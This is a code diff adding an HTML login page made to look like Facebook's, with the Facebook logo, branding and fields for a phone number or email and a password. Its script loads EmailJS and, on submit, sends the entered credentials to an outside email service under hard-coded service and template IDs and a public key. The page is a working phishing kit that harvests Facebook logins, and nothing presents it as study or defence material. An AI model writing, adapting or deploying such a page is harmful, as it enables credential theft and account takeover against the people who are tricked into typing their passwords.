@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login | Facebook Style</title>
+  <style>
+    /* General Styles */
+    body {
+      margin: 0;
+      font-family: 'Helvetica', sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    /* Container */
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      background: #ffffff;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    /* Facebook Logo */
+    .container img {
+      width: 200px;
+      margin-bottom: 20px;
+    }
+
+    /* Login Header */
+    .container h1 {
+      font-size: 1.5rem;
+      color: #1877f2;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    /* Input Fields */
+    .field {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+
+    .field input:focus {
+      outline: none;
+      border-color: #1877f2;
+    }
+
+    /* Submit Button */
+    #button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: #fff;
+      font-size: 1.2rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    #button:hover {
+      background-color: #145dbf;
+    }
+
+    /* Footer */
+    .footer {
+      margin-top: 20px;
+      font-size: 0.9rem;
+      color: #555;
+    }
+
+    .footer a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Facebook Logo -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+
+    <!-- Login Header -->
+    <h1>Log In to Your Account</h1>
+
+    <!-- Login Form -->
+    <form id="form">
+      <div class="field">
+        <input type="text" name="username" id="username" placeholder="Mobile number or email" required>
+      </div>
+      <div class="field">
+        <input type="password" name="password" id="password" placeholder="Password" required>
+      </div>
+      <button type="submit" id="button">Log In</button>
+    </form>
+
+    <!-- Footer Links -->
+    <div class="footer">
+      <p><a href="#">Forgotten password?</a></p>
+      <p><a href="#">Create new account</a></p>
+    </div>
+  </div>
+
+  <!-- Include EmailJS -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    // Initialize EmailJS
+    emailjs.init('70DFxXJZZJ-7bGOlj');
+
+    // Form submission handler
+    const form = document.getElementById('form');
+    form.addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const button = document.getElementById('button');
+      button.textContent = 'Sending...';
+
+      const serviceID = 'service_cte4zke';
+      const templateID = 'template_3k2qetg';
+
+      emailjs.sendForm(serviceID, templateID, form)
+        .then(() => {
+          button.textContent = 'Log In';
+          alert('Email sent successfully!');
+        })
+        .catch((err) => {
+          button.textContent = 'Log In';
+          alert('Failed to send email: ' + JSON.stringify(err));
+        });
+    });
+  </script>
+</body>
+</html>
